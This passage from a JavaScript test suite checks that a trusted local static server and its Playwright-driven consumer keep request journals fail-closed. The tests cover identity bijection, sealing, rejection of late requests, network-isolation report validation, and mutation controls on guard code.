  assert.equal(lifecycle.snapshot().state, "QUIESCING");
  const first = lifecycle.observeQuiescence("journal:1/events:1");
  lifecycle.recordEvent("requestfailed");
  const changed = lifecycle.observeQuiescence("journal:2/events:2");
  assert.equal(first.stableSamples, 1);
  assert.equal(changed.stableSamples, 1, "an event during quiescence must reset stability");
  lifecycle.seal("journal:2/events:2");
  assert.equal(lifecycle.snapshot().state, "SEALED");
  assert.throws(() => lifecycle.recordEvent("late-requestfailed"), /after.*seal|sealed|late/i);
  assert.equal(lifecycle.snapshot().state, "REJECTED");

  const finalized = trustedConsumer.createTrustedCollectionLifecycle("webkit finalized");
  finalized.beginQuiescence();
  finalized.observeQuiescence("stable");
  finalized.seal("stable");
  finalized.verify("stable");
  assert.equal(finalized.snapshot().state, "VERIFIED");
  assert.throws(() => finalized.recordEvent("immediately-after-finalize"), /after.*seal|verified|late/i);
  assert.equal(finalized.snapshot().state, "REJECTED");
});

test("F2-GOV-09-F12 enforces a closed server-owned journal bijection", () => {
  assert.equal(typeof trustedConsumer.assertTrustedJournalBijection, "function", "closed trusted journal verifier is absent");
  const windowId = "window-1";
  const url = "http://127.0.0.1:4173/media/fixture.webm";
  const requestId = "1".repeat(64);
  const internalRequestId = "2".repeat(64);
  const boundJournalId = "a".repeat(64);
  const internalJournalId = "b".repeat(64);
  const localRequest = { requestId, url, route: "media/fixture.webm", range: "bytes=0-31" };
  const internalRequest = { requestId: internalRequestId, url, route: "media/fixture.webm", range: "bytes=0-" };
  const localResponse = { ...localRequest, status: 206, journalId: boundJournalId };
  const internalResponse = { ...internalRequest, status: 206, journalId: internalJournalId };
  const failure = { ...localRequest, reason: "Load request cancelled", journalId: boundJournalId };
  const bound = { sequence: 4, windowId, journalId: boundJournalId, requestId, method: "GET", absoluteUrl: url, route: "media/fixture.webm", range: "bytes=0-31", rangeStart: 0, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 32, finished: true };
  const internal = { sequence: 3, windowId, journalId: internalJournalId, requestId: internalRequestId, method: "GET", absoluteUrl: url, route: "media/fixture.webm", range: "bytes=0-", rangeStart: 0, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 32, finished: true };
  const verify = (overrides = {}) => trustedConsumer.assertTrustedJournalBijection({
    engine: "webkit",
    windowId,
    localRequests: [localRequest, internalRequest],
    localResponses: [localResponse, internalResponse],
    localFailures: [failure],
    journal: [internal, bound],
    ...overrides,
  });
  assert.doesNotThrow(() => verify(), "server journal media records with an explicit request identity must remain attributable");
  assert.doesNotThrow(() => verify({ journal: [bound, internal] }), "journal verification must be order-independent");
  assert.throws(() => verify({ journal: [{ ...internal, requestId: null }, bound] }), /extra|unattributed|identity.*absent/i, "browser evidence must not supply an identity absent from the server journal");
  assert.throws(() => verify({ journal: [...verifyJournal(), { ...internal, sequence: 5, journalId: "c".repeat(64) }] }), /extra|bijection|unattributed|cardinality|binding is duplicated/i, "an extra internal record for the same resource must not escape the closed bijection");
  assert.throws(() => verify({ localResponses: [{ ...localResponse, journalId: undefined }, internalResponse] }), /journal identity.*absent|malformed|bijection/i, "a response without its server-owned journal identity must fail closed");
  assert.throws(() => verify({ localResponses: [{ ...localResponse, journalId: "not-a-journal-id" }, internalResponse] }), /journal identity.*absent|malformed/i);
  assert.throws(() => verify({ localResponses: [localResponse, { ...internalResponse, journalId: boundJournalId }] }), /journal identity is duplicated|cardinality/i);
  assert.throws(() => verify({ localResponses: [{ ...localResponse, journalId: internalJournalId }, { ...internalResponse, journalId: boundJournalId }] }), /URL is divergent|range is divergent|request identity is divergent/i, "journal identities transplanted between valid responses must fail closed");
  assert.throws(() => verify({ journal: [...verifyJournal(), { ...internal, sequence: 5, journalId: "c".repeat(64), absoluteUrl: "http://127.0.0.1:4173/unknown.bin", route: "unknown.bin", status: 404 }] }), /extra|unknown|unattributed|status|binding is duplicated/i);
  assert.throws(() => verify({ journal: [...verifyJournal(), { ...internal, sequence: 5, journalId: "d".repeat(64), requestId: "2".repeat(64) }] }), /unknown.*request|unattributed|cardinality|binding is duplicated/i);
  assert.throws(() => verify({ journal: [internal, bound, { ...bound, sequence: 5 }] }), /journal.*duplicated|journal.*identity/i);
  assert.throws(() => verify({ journal: [internal] }), /failure.*journal|bound.*absent|bijection|no bound journal|cardinality/i);
  assert.throws(() => verify({ localFailures: [{ ...failure, requestId: "2".repeat(64) }] }), /failure.*request|identity|bijection/i);
  assert.throws(() => verify({ journal: [{ ...internal, windowId: "other-window" }, bound] }), /window.*divergent/i);

  function verifyJournal() { return [internal, bound]; }
});

test("F2-GOV-09-F13 derives a missing browser response from exactly one completed server-owned record", () => {
  const windowId = "window-f13-missing-response";
  const requestId = "1".repeat(64);
  const journalId = "a".repeat(64);
  const url = "http://127.0.0.1:4173/media/fixture.webm";
  const request = { requestId, url, route: "media/fixture.webm", range: "bytes=0-31", resourceType: "media" };
  const record = { sequence: 0, windowId, journalId, requestId, method: "GET", absoluteUrl: url, route: request.route, range: request.range, rangeStart: 0, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 32, finished: true };
  const result = trustedConsumer.assertTrustedJournalBijection({
    engine: "chromium",
    windowId,
    localRequests: [request],
    localResponses: [],
    localFailures: [],
    journal: [record],
    journalRejections: [],
  });
  assert.equal(result.boundRequests, 1);
  assert.equal(result.trustedResponses, 1);
  assert.equal(result.indeterminateBrowserResponses, 0);
});

test("F2-GOV-09-F13 never promotes status zero while reconciling the CI 0/200 observation vector", () => {
  const windowId = "window-f13-zero-two-hundred";
  const requestId = "2".repeat(64);
  const journalId = "b".repeat(64);
  const url = "http://127.0.0.1:4173/media/fixture.webm";
  const request = { requestId, url, route: "media/fixture.webm", range: null, resourceType: "media" };
  const record = { sequence: 0, windowId, journalId, requestId, method: "GET", absoluteUrl: url, route: request.route, range: null, rangeStart: null, rangeEnd: null, totalBytes: 32, status: 200, bytes: 32, finished: true };
  const result = trustedConsumer.assertTrustedJournalBijection({
    engine: "webkit",
    windowId,
    localRequests: [request],
    localResponses: [
      { ...request, status: 0, journalId: null },
      { ...request, status: 200, journalId },
    ],
    localFailures: [],
    journal: [record],
    journalRejections: [],
  });
  assert.equal(result.trustedResponses, 1);
  assert.equal(result.indeterminateBrowserResponses, 1);
  assert.throws(() => trustedConsumer.assertTrustedLocalResponseStatus(0, url), /status 0/i);
});

test("F2-GOV-09-F13 attributes a headerless internal media refusal to one server-owned rejection identity", () => {
  const windowId = "window-f13-internal-refusal";
  const rejectionId = "c".repeat(64);
  const url = "http://127.0.0.1:4173/media/fixture.webm";
  const rejection = { sequence: 0, windowId, rejectionId, requestId: null, method: "GET", absoluteUrl: url, route: "media/fixture.webm", range: "bytes=0-", status: 403, bytes: 0, finished: true, authorized: false };
  const result = trustedConsumer.assertTrustedJournalBijection({
    engine: "webkit",
    windowId,
    localRequests: [],
    localResponses: [{ requestId: null, rejectionId, url, route: rejection.route, range: rejection.range, status: 403, resourceType: "media" }],
    localFailures: [],
    journal: [],
    journalRejections: [rejection],
  });
  assert.equal(result.refusedInternalRequests, 1);
  assert.equal(result.trustedResponses, 0);
});

test("F2-GOV-09-F13 keeps identity, cardinality and sealing fail-closed under adversarial ordering", () => {
  const windowId = "window-f13-adversarial";
  const url = "http://127.0.0.1:4173/media/fixture.webm";
  const requestA = { requestId: "1".repeat(64), url, route: "media/fixture.webm", range: "bytes=0-15", resourceType: "media" };
  const requestB = { requestId: "2".repeat(64), url, route: "media/fixture.webm", range: "bytes=16-31", resourceType: "media" };
  const recordA = { sequence: 0, windowId, journalId: "a".repeat(64), requestId: requestA.requestId, method: "GET", absoluteUrl: url, route: requestA.route, range: requestA.range, rangeStart: 0, rangeEnd: 15, totalBytes: 32, status: 206, bytes: 16, finished: true };
  const recordB = { sequence: 1, windowId, journalId: "b".repeat(64), requestId: requestB.requestId, method: "GET", absoluteUrl: url, route: requestB.route, range: requestB.range, rangeStart: 16, rangeEnd: 31, totalBytes: 32, status: 206, bytes: 16, finished: true };
  const observationA = { ...requestA, status: 206, journalId: recordA.journalId };
  const observationB = { ...requestB, status: 206, journalId: recordB.journalId };
  const verify = (overrides = {}) => trustedConsumer.assertTrustedJournalBijection({
    engine: "chromium",
    windowId,
    localRequests: [requestA, requestB],
    localResponses: [observationA, observationB],
    localFailures: [],
    journal: [recordA, recordB],
    journalRejections: [],
    ...overrides,
  });
  assert.equal(verify({ localRequests: [requestB, requestA], localResponses: [observationB, observationA], journal: [recordB, recordA] }).trustedResponses, 2, "the closed bijection must be order-independent");
  assert.throws(() => verify({ journal: [recordA, { ...recordB, requestId: requestA.requestId }] }), /cardinality|divergent|binding is duplicated/i, "duplicate request binding must fail");
  assert.throws(() => verify({ localResponses: [observationA, { ...observationA }] }), /cardinality|duplicated/i, "duplicate browser observation must fail");
  assert.throws(() => verify({ localResponses: [{ ...observationA, status: 0, journalId: null }], journal: [recordB] }), /cardinality|completed server-owned record|unknown/i, "status zero without its exact completed record must fail");
  assert.throws(() => verify({ localRequests: [{ ...requestA, requestId: null }, requestB] }), /request identity is absent/i);
  assert.throws(() => verify({ journal: [{ ...recordA, requestId: requestB.requestId }, recordB] }), /cardinality|binding is duplicated|URL.*divergent|range.*divergent/i, "a swapped identity must fail");
  assert.throws(() => verify({ journal: [{ ...recordA, absoluteUrl: `${url}?forged=1` }, recordB] }), /URL.*divergent/i);
  assert.throws(() => verify({ journal: [{ ...recordA, range: "bytes=1-15" }, recordB] }), /range.*divergent/i);
  assert.throws(() => verify({ journal: [recordA, recordB, { ...recordA, sequence: 2, journalId: "c".repeat(64), requestId: null }] }), /extra|unattributed|cardinality/i, "an extra journal record must fail");

  const rejection = { sequence: 2, windowId, rejectionId: "d".repeat(64), requestId: null, method: "GET", absoluteUrl: url, route: requestA.route, range: "bytes=0-", status: 403, bytes: 0, finished: true, authorized: false };
  const refusal = { requestId: null, rejectionId: rejection.rejectionId, url, route: rejection.route, range: rejection.range, status: 403, resourceType: "media" };
  assert.throws(() => verify({ journalRejections: [{ ...rejection, rejectionId: null }], localResponses: [observationA, observationB, refusal] }), /refusal identity is absent|malformed/i);
  assert.throws(() => verify({ journalRejections: [rejection, { ...rejection }], localResponses: [observationA, observationB, refusal] }), /refusal identity is duplicated/i);
  assert.throws(() => verify({ journalRejections: [rejection], localResponses: [observationA, observationB, { ...refusal, rejectionId: "e".repeat(64) }] }), /no server-owned rejection record/i);

  const lifecycle = trustedConsumer.createTrustedCollectionLifecycle("F13 late event");
  lifecycle.beginQuiescence();
  lifecycle.observeQuiescence("stable");
  lifecycle.seal("stable");
  assert.throws(() => lifecycle.recordEvent("late-response"), /late event after seal/i);
});

test("F2-GOV-09-F13 rejects a late invalid route after the trusted server window is verified", async () => {
  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f13-late-invalid-"));
  const bytes = Buffer.from("<!doctype html><title>sealed</title>");
  await write(directory, "index.html", bytes);
  const server = await trustedServer.startTrustedStaticServer(directory, [{ path: "index.html", sha256: sha256ForTest(bytes) }], 0);
  try {
    const window = server.openJournalWindow();
    window.beginQuiescence();
    window.seal();
    window.verify();
    const response = await fetch(`${server.origin}/not-allowlisted`);
    assert.equal(response.status, 409, "every request after seal must be rejected before route classification");
    const snapshot = window.snapshot();
    assert.equal(snapshot.state, "REJECTED");
    assert.match(snapshot.violation ?? "", /late request after seal/i);
  } finally {
    await server.close();
    await rm(directory, { recursive: true, force: true });
  }
});

test("F2-GOV-09-F13 never lets a browser observation supply a missing journal identity", () => {
  const windowId = "window-f13-browser-not-authority";
  const requestId = "7".repeat(64);
  const journalId = "8".repeat(64);
  const url = "http://127.0.0.1:4173/media/fixture.webm";
  const request = { requestId, url, route: "media/fixture.webm", range: null, resourceType: "media" };
  const record = { sequence: 0, windowId, journalId, requestId, method: "GET", absoluteUrl: url, route: request.route, range: null, rangeStart: null, rangeEnd: null, totalBytes: 32, status: 200, bytes: 32, finished: true };
  const verify = (overrides = {}) => trustedConsumer.assertTrustedJournalBijection({
    engine: "chromium",
    windowId,
    localRequests: [request],
    localResponses: [],
    localFailures: [],
    journal: [record],
    journalRejections: [],
    ...overrides,
  });
  assert.throws(
    () => verify({ localResponses: [{ ...request, status: 200, journalId }], journal: [{ ...record, requestId: null }] }),
    /extra or unattributed|identity.*absent|request identity/i,
    "a browser response must never fill an identity absent from the server journal",
  );
});

test("F2-GOV-09-F13 rejects duplicate indeterminate status-zero observations", () => {
  const windowId = "window-f13-zero-cardinality";
  const requestId = "9".repeat(64);
  const journalId = "a".repeat(64);
  const url = "http://127.0.0.1:4173/media/fixture.webm";
  const request = { requestId, url, route: "media/fixture.webm", range: null, resourceType: "media" };
  const record = { sequence: 0, windowId, journalId, requestId, method: "GET", absoluteUrl: url, route: request.route, range: null, rangeStart: null, rangeEnd: null, totalBytes: 32, status: 200, bytes: 32, finished: true };
  const zero = { ...request, status: 0, journalId: null };
  assert.throws(
    () => trustedConsumer.assertTrustedJournalBijection({
      engine: "chromium",
      windowId,
      localRequests: [request],
      localResponses: [zero, { ...zero }],
      localFailures: [],
      journal: [record],
      journalRejections: [],
    }),
    /indeterminate.*duplicated|cardinality/i,
    "duplicate status-zero observations must fail closed",
  );
});

test("F2-GOV-09-F13 mutation controls keep server authority and refusal identity load-bearing", () => {
  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  const staticServer = workingFile(CANONICAL_AUTHORITY_PATHS.staticServer).toString("utf8");
  const assertConsumerGuards = (source) => {
    assert.match(source, /response\.status === 0/);
    assert.match(source, /indeterminateObservationByRequest\.has\(response\.requestId\)/);
    assert.match(source, /const requestId = record\.requestId;/);
    assert.match(source, /trustedResponseByRequest\.has\(request\.requestId\)/);
    assert.match(source, /rejection\.status, 403/);
    assert.match(source, /refusalObservationByRejection\.get\(rejection\.rejectionId\)/);
    assert.match(source, /journalRejections: sealedSnapshot\.rejections/);
  };
  const assertServerGuards = (source) => {
    assert.match(source, /rejectionId: window \? sha256/);
    assert.match(source, /"x-branct-trusted-rejection-id": record\.rejectionId/);
    assert.match(source, /record\.authorized !== true/);
    const lateGuard = source.indexOf('if (window && ["SEALED", "VERIFIED", "REJECTED"].includes(window.state))');
    const routeValidation = source.indexOf("validateTrustedStaticRequest(absolute, origin, expectedFiles)");
    assert.ok(lateGuard >= 0 && routeValidation >= 0 && lateGuard < routeValidation, "late-request guard must precede route classification");
  };
  assert.doesNotThrow(() => assertConsumerGuards(consumer));
  assert.doesNotThrow(() => assertServerGuards(staticServer));
  for (const pattern of [
    "response.status === 0",
    "indeterminateObservationByRequest.has(response.requestId)",
    "const requestId = record.requestId;",
    "trustedResponseByRequest.has(request.requestId)",
    "rejection.status, 403",
    "refusalObservationByRejection.get(rejection.rejectionId)",
    "journalRejections: sealedSnapshot.rejections",
  ]) {
    const mutated = consumer.replaceAll(pattern, "false");
    assert.notEqual(mutated, consumer, `consumer mutation did not alter bytes: ${pattern}`);
    assert.throws(() => assertConsumerGuards(mutated), /input did not match/i, `consumer mutation escaped: ${pattern}`);
  }
  for (const pattern of [
    "rejectionId: window ? sha256",
    '"x-branct-trusted-rejection-id": record.rejectionId',
    "record.authorized !== true",
    'if (window && ["SEALED", "VERIFIED", "REJECTED"].includes(window.state))',
  ]) {
    const mutated = staticServer.replace(pattern, "false");
    assert.notEqual(mutated, staticServer, `server mutation did not alter bytes: ${pattern}`);
    assert.throws(() => assertServerGuards(mutated), /input did not match|late-request guard/i, `server mutation escaped: ${pattern}`);
  }
});

test("F2-GOV-09-F12 trusted server owns journal identities and rejects post-seal records", async () => {
  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f12-journal-"));
  const bytes = Buffer.from("trusted journal fixture");
  await write(directory, "fixture.txt", bytes);
  const server = await trustedServer.startTrustedStaticServer(directory, [{ path: "fixture.txt", sha256: sha256ForTest(bytes) }], 0);
  try {
    assert.equal(typeof server.openJournalWindow, "function", "server-owned journal window is absent");
    const window = server.openJournalWindow();
    const refused = await fetch(`${server.origin}/fixture.txt`);
    assert.equal(refused.status, 403, "a request without the consumer-only capability must be refused before entering the authoritative journal");
    const response = await fetch(`${server.origin}/fixture.txt`, { headers: window.authorizeHeaders() });
    assert.equal(response.status, 200);
    const openSnapshot = window.snapshot();
    assert.equal(openSnapshot.state, "OPEN");
    assert.equal(openSnapshot.records.length, 1);
    assert.equal(openSnapshot.rejections.length, 1);
    assert.match(openSnapshot.records[0].journalId, /^[0-9a-f]{64}$/);
    assert.equal(response.headers.get("x-branct-trusted-journal-id"), openSnapshot.records[0].journalId);
    assert.equal(openSnapshot.records[0].windowId, openSnapshot.windowId);
    window.beginQuiescence();
    window.seal();
    const late = await fetch(`${server.origin}/fixture.txt`);
    assert.equal(late.status, 409);
    assert.equal(window.snapshot().state, "REJECTED");
    assert.throws(() => window.verify(), /late|rejected|sealed/i);
  } finally {
    await server.close();
    await rm(directory, { recursive: true, force: true });
  }
});

test("F2-GOV-09-F12 operational finalization rejects an event immediately after verification", async () => {
  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f12-operational-"));
  const bytes = Buffer.from("<!doctype html><title>trusted journal</title>");
  await write(directory, "index.html", bytes);
  const server = await trustedServer.startTrustedStaticServer(directory, [{ path: "index.html", sha256: sha256ForTest(bytes) }], 0);
  const { chromium } = await import("playwright");
  const browser = await chromium.launch({ headless: true });
  try {
    const context = await browser.newContext();
    const policy = await trustedConsumer.installRuntimeNetworkPolicy(context, server, "chromium", "candidate-flow");
    const page = await context.newPage();
    await page.goto(`${server.origin}/index.html`, { waitUntil: "load" });
    await page.close();
    await context.close();
    await policy.finalizeLocalFailureCorrelations();
    assert.equal(policy.assertStillVerified(), true);
    const late = await fetch(`${server.origin}/index.html`);
    assert.equal(late.status, 409);
    assert.throws(() => policy.assertStillVerified(), /no longer verified|rejected|late/i);
  } finally {
    await browser.close();
    await server.close();
    await rm(directory, { recursive: true, force: true });
  }
});

test("F2-GOV-09-F12 mutation controls keep quiescence, sealing, extras and bijection load-bearing", () => {
  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  const staticServer = workingFile(CANONICAL_AUTHORITY_PATHS.staticServer).toString("utf8");
  const assertGuards = (source) => {
    assert.match(source, /collection\.beginQuiescence\(\);/);
    assert.match(source, /journalWindow\.beginQuiescence\(\);/);
    assert.match(source, /stable < 4/);
    assert.match(source, /collection\.seal\(fingerprint\);/);
    assert.match(source, /journalWindow\.seal\(\);/);
    assert.match(source, /boundRequestByJournal\.has\(record\.journalId\)/);
    assert.match(source, /trustedResponseByRequest\.has\(request\.requestId\)/);
    assert.match(source, /response\.headers\(\)\["x-branct-trusted-journal-id"\]/);
    assert.match(source, /journalWindow\.authorizeHeaders\(headers\)/);
    assert.match(source, /const correlation = assertTrustedJournalBijection\(\{/);
  };
  assert.doesNotThrow(() => assertGuards(consumer));
  assert.match(staticServer, /request\.headers\["x-branct-trusted-window-capability"\] === window\.capability/);
  assert.match(staticServer, /record\.authorized !== true/);
  for (const [label, pattern] of [
    ["consumer quiescence", "    collection.beginQuiescence();"],
    ["server quiescence", "    journalWindow.beginQuiescence();"],
    ["consumer seal", "    collection.seal(fingerprint);"],
    ["server seal", "    journalWindow.seal();"],
    ["extra journal rejection", "boundRequestByJournal.has(record.journalId)"],
    ["server response cardinality", "trustedResponseByRequest.has(request.requestId)"],
    ["server-owned response binding", "response.headers()[\"x-branct-trusted-journal-id\"]"],
    ["consumer-only request capability", "journalWindow.authorizeHeaders(headers)"],
    ["closed bijection", "const correlation = assertTrustedJournalBijection({"],
  ]) {
    const mutated = consumer.replace(pattern, label === "extra journal rejection" ? "true" : "");
    assert.notEqual(mutated, consumer, `${label} mutation did not alter bytes`);
    assert.throws(() => assertGuards(mutated), /input did not match/i, `${label} mutation escaped the structural guard`);
  }
  for (const pattern of [
    'request.headers["x-branct-trusted-window-capability"] === window.capability',
    "record.authorized !== true",
  ]) {
    const mutated = staticServer.replace(pattern, "false");
    assert.notEqual(mutated, staticServer, "server capability mutation did not alter bytes");
    assert.throws(() => {
      assert.match(mutated, /request\.headers\["x-branct-trusted-window-capability"\] === window\.capability/);
      assert.match(mutated, /record\.authorized !== true/);
    }, /input did not match/i, "server capability mutation escaped the structural guard");
  }
});

for (const [label, mutate, expected] of [
  ["blocked attempt treated as harmless", (report) => { report.reports[0].networkIsolation.flowAttempts.push({ mechanism: "fetch", url: "https://example.invalid", origin: "https://example.invalid", phase: "measured-flow", engine: "chromium", action: "measure-responsive", route: "index.html", viewport: "390x844", disposition: "BLOCKED_BEFORE_EGRESS" }); }, /observed external network attempt/i],
  ["WebSocket interceptor removed", (report) => { report.reports[0].networkIsolation.controls = report.reports[0].networkIsolation.controls.filter(({ action }) => action !== "WebSocket"); }, /control vector is incomplete/i],
  ["Service Worker interceptor removed", (report) => { report.reports[0].networkIsolation.controls = report.reports[0].networkIsolation.controls.filter(({ action }) => action !== "serviceWorker.register"); }, /control vector is incomplete/i],
  ["HTTP control reported without observation", (report) => { report.reports[0].networkIsolation.controls.find(({ action }) => action === "fetch").observed = []; }, /control observation cardinality/i],
  ["local i18n confinement weakened", (report) => { report.reports[0].networkIsolation.localI18nSuccessCount = 0; }, /local i18n fetch was not verified/i],
]) test(`F2-GOV-09 mutation control rejects ${label}`, () => {
  const fixture = canonicalOperationalFixture();
  mutate(fixture.report);
  assert.throws(() => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest), expected);
});

test("F2-GOV-09-F8 binds the canonical Playwright cache before loading the trusted package", () => {
  const runtime = JSON.parse(workingFile(CANONICAL_AUTHORITY_PATHS.runtime).toString("utf8"));
  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  assertCanonicalPlaywrightCacheBinding(consumer, runtime);
});

test("F2-GOV-09-F8 rejects an absent browser cache and a divergent Playwright version", async () => {
  assert.equal(typeof trustedConsumer.validateTrustedPlaywrightInstallation, "function", "trusted Playwright installation validator is absent");
  const cache = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-f8-cache-"));
  try {
    const runtime = {
      playwright: { version: "1.62.0", engines: ["chromium", "firefox", "webkit"] },
      container: { browsersPath: cache },
    };
    const executables = Object.fromEntries(runtime.playwright.engines.map((engine) => [engine, join(cache, engine, `${engine}.bin`)]));
    for (const path of Object.values(executables)) {
      await mkdir(dirname(path), { recursive: true });
      await writeFile(path, "trusted-browser");
    }
    assert.doesNotThrow(() => trustedConsumer.validateTrustedPlaywrightInstallation(runtime, "1.62.0", executables));
    const missingCacheRuntime = structuredClone(runtime);
    missingCacheRuntime.container.browsersPath = join(cache, "absent");
    assert.throws(() => trustedConsumer.validateTrustedPlaywrightInstallation(missingCacheRuntime, "1.62.0", executables), /cache is absent/i);
    await rm(executables.chromium);
    assert.throws(() => trustedConsumer.validateTrustedPlaywrightInstallation(runtime, "1.62.0", executables), /chromium.*executable.*absent|cache.*incomplete/i);
    await writeFile(executables.chromium, "trusted-browser");
    assert.throws(() => trustedConsumer.validateTrustedPlaywrightInstallation(runtime, "1.61.1", executables), /version.*divergent/i);
  } finally {
    await rm(cache, { recursive: true, force: true });
  }
});

test("F2-GOV-09-F8 mutation proves the exact cache binding is load-bearing", () => {
  const runtime = JSON.parse(workingFile(CANONICAL_AUTHORITY_PATHS.runtime).toString("utf8"));
  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
  assertCanonicalPlaywrightCacheBinding(consumer, runtime);
  const weakened = consumer.replace("process.env.PLAYWRIGHT_BROWSERS_PATH = runtime.container.browsersPath;", "");
  assert.notEqual(weakened, consumer, "cache-binding mutation did not alter bytes");
  assert.throws(() => assertCanonicalPlaywrightCacheBinding(weakened, runtime), /not bound before Playwright loads/i);
});
